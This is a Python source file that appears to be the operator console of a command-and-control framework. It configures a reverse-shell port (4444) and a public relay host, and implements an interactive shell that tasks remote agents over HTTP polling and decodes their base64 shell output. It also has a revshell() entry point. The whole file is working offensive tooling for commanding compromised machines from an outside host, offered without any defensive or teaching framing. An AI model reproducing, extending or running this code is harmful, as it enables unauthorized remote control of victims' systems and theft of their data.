import base64
import os
import re
import select
import signal
import struct
import sys
import termios
import time
import tty
from colorama import Fore, Style


RS_PORT = 4444
PUBLIC_RS = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def _read_chars():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf = ""
    try:
        tty.setraw(fd)
        while True:
            ch = os.read(fd, 1).decode(errors="replace")
            if ch == "\r" or ch == "\n":
                _write("\r\n")
                return buf
            if ch == "\x03":
                raise KeyboardInterrupt
            if ch == "\x7f":
                if buf:
                    buf = buf[:-1]
                    _write("\b \b")
                continue
            buf += ch
            _write(ch)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def _fast_http_shell(manager, agent_id):
    _write(f"{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}\n")

    cmd = "echo __C2_READY__"
    tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})

    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            out = r.get("output", "")
            if r.get("task_id") == tid:
                prompt = (
                    out.replace("__C2_READY__\r\n", "")
                    .replace("__C2_READY__\n", "")
                    .replace("__C2_READY__", "")
                    .strip()
                )
                if prompt:
                    _write(prompt + " ")
                break
        else:
            continue
        break
    else:
        _write("[!] Shell init failed\n")
        return

    while True:
        try:
            cmd = _read_chars()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        tid = manager.send_task(
            agent_id, "shell_interactive", {"command": cmd.strip()}
        )
        if not tid:
            break

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    lines = out.split("\n")
                    if lines and lines[0].strip() == cmd.strip():
                        out = "\n".join(lines[1:])
                    if out.rstrip():
                        _write(out.rstrip("\r\n") + "\n")
                    break
            else:
                continue
            break

        for _ in range(4):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        data = data.lstrip("\r\n ")
                        if data:
                            _write(data)
                    except Exception:
                        pass


def revshell(manager, agent_id, c2_server):
    _write(f"{Fore.CYAN}[*] Starting shell via HTTP (fast polling){Style.RESET_ALL}\n")
    _fast_http_shell(manager, agent_id)
